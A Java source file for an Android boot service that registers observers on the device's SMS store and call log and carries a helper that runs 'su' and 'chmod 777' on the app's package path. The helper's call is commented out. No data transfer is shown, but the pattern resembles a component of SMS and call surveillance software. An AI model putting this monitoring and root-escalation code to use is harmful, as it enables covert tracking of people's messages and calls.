package com.yfm.sms;

import java.io.DataOutputStream;

import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;

public class BootServer extends Service {

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		//upgradeRootPermission(getPackageCodePath()); 
		Loginfo.write("server", "server启动");
		PendingIntent pi = PendingIntent.getBroadcast(
				BootServer.this, 0,
				new Intent("android.intent.action.yfm.sms_Send"), 0);
		ContentResolver cr= this.getContentResolver();
        SMSConten content=new SMSConten(cr,new Handler(),pi);
        this.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, content);
        CallConten clcontent=new CallConten(cr, new Handler(),pi);
        this.getContentResolver().registerContentObserver(CallLog.Calls.CONTENT_URI, true, clcontent);
    }
	public static boolean upgradeRootPermission(String pkgCodePath) { 
        Process process = null; 
        DataOutputStream os = null; 
        try { 
        	Loginfo.write("授权", "授权开始");
            String cmd="chmod 777 " + pkgCodePath; 
            process = Runtime.getRuntime().exec("su"); //切换到root帐号 
            os = new DataOutputStream(process.getOutputStream()); 
            os.writeBytes(cmd + "\n"); 
            os.writeBytes("exit\n"); 
            os.flush(); 
            process.waitFor(); 
            Loginfo.write("授权", "授权结束");
        } catch (Exception e) { 
            return false; 
        } finally { 
            try { 
                if (os != null) { 
                    os.close(); 
                } 
                process.destroy(); 
            } catch (Exception e) { 
            } 
        } 
        return true; 
    } 

	



	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
}
